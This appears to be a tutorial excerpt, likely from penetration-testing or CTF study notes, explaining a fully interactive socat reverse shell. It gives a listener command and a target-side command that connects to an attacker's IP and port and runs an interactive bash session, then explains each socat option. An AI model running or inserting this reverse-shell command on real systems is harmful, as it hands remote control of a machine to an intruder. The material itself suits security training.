Listener:

```
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

We're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, `stty raw -echo; fg` trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.


Attacker:

```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  `EXEC:"bash -li"`. We're also passing the arguments: pty, stderr, sigint, setsid and sane:

- **`pty`**, allocates a pseudoterminal on the target -- part of the stabilisation process
- **`stderr`**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells) 
- **`sigint`**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- **`setsid`**, creates the process in a new session
- **`sane`**, stabilises the terminal, attempting to "normalise" it.